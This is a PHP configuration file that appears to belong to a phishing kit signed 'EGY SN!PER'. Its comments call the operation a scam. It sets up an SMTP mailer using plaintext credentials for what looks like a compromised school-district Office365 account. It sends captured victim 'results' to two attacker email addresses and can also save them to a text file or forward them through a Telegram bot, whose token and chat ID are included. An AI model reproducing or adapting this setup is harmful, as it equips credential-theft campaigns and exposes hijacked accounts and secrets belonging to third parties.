<?php
	/*
   ______ _______     __   _____ _  _* _ _____  ______ _____  
 |  ____/ ____\ \   / /  / ____| \ | | |  __ \|  ____|  __ \ 
 | |__ | |  __ \ \_/ /  | (___ |  \| | | |__) | |__  | |__) |
 |  __|| | |_ | \   /    \___ \| . ` | |  ___/|  __| |  _  /     ©
 | |___| |__| |  | |     ____) | |\  |_| |    | |____| | \ \ 
 |______\_____|  |_|    |_____/|_| \_(_)_|    |______|_|  \_\
              
	*/
	// =========SMTP CONFIG============= //
	function mailer($yours,$msg,$subject,$sender_name){

	    $mail = new PHPMailer(true);
	    $mail->isSMTP();
	    $mail->Host = 'smtp.office365.com'; //Server IP or Host//
	    $mail->Port       = 587;
	    $mail->SMTPSecure = 'tls';
	    $mail->SMTPAuth   = true;
	    $mail->Username = '003331@stockdaleisd.org'; //E-mail Or userName//
	    $mail->Password = '003331'; //Password of SMTP//
	    $mail->SetFrom('003331@stockdaleisd.org', $sender_name);
	    $mail->addAddress($yours, 'ToEmail');
	    $mail->IsHTML(true);

	    $mail->Subject = $subject;
	    $mail->Body    = $msg;
	    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

	    if(!$mail->send()) {
	        echo 'Message could not be sent to ';
	        echo "<br>";
	    } else {
	        echo "Message has been sent to : ", $yours, "";
	        echo "<br>";
	    }
	}

	// ================================= //
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "rzlt";
	// ================================= //
	$dev = "EGSN!PER";
	$mail = "yes";
	$to = "egyptsniper@mail.ru,hamalt.iq@gmail.com"; 	 // Edit this to your email 
	
	//TELEGRAM INFORMATION//
	$telegram = "no";
    $config_token = "1891317055:AAEKSwRyvtFcOG9DSeAQYEo1t7Drp_e6if4";
    $config_chat = "934815771";
    // END OF TELEGRAM INFORMATION //

?>